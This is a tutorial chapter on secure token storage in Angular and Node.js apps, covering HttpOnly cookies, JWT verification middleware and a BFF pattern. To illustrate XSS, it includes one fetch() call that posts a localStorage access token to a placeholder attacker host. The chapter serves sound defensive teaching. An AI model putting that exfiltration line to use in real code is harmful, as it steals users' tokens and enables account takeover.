09. Fullstack Token Storage (Angular & Node.js)

In Angular + Node.js/ORDS stacks, the hardest question is where tokens live. A bad choice turns one XSS into full account takeover.

Why LocalStorage Is Dangerous

Anything in localStorage is readable by JavaScript. If XSS lands, attackers exfiltrate tokens instantly.

fetch("https://attacker.example/steal", {
  method: "POST",
  body: localStorage.getItem("access_token")
});

Prefer HttpOnly & Secure Cookies

Set-Cookie: access_token=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
Set-Cookie: refresh_token=...; Path=/auth/refresh; HttpOnly; Secure; SameSite=Strict

HttpOnly blocks document.cookie access. Secure restricts transport to HTTPS. SameSite mitigates CSRF. Narrow refresh cookie paths to shrink exposure.

this.http.get("/api/orders", { withCredentials: true });

Node.js Middleware: Verify Then Authorize

function requireAuth(req, res, next) {
  try {
    const token = extractToken(req);
    const payload = jwt.verify(token, process.env.JWT_PUBLIC_KEY, {
      algorithms: ["RS256"],
      issuer: process.env.JWT_ISSUER,
      audience: process.env.JWT_AUDIENCE
    });
    req.user = payload;
    next();
  } catch {
    return res.status(401).json({ error: "invalid_token" });
  }
}

function requireScope(required) {
  return (req, res, next) => {
    const scopes = String(req.user?.scope || "").split(" ").filter(Boolean);
    const needed = Array.isArray(required) ? required : [required];
    if (!needed.every((s) => scopes.includes(s))) {
      return res.status(403).json({ error: "insufficient_scope" });
    }
    next();
  };
}

Place the same checks in front of ORDS proxies so only verified, sufficiently scoped requests reach downstream services.

Practical Ranking

  1. Best: BFF holds tokens; browser only has a session cookie
  2. Good: HttpOnly Secure SameSite cookies
  3. Avoid: LocalStorage + JS-attached Authorization headers

Chapter Summary

  • LocalStorage tokens are XSS-theft magnets.
  • HttpOnly Secure SameSite cookies keep secrets out of JavaScript.
  • Verify signatures and claims, then enforce scopes separately.
  • Prefer BFF patterns when security requirements are high.
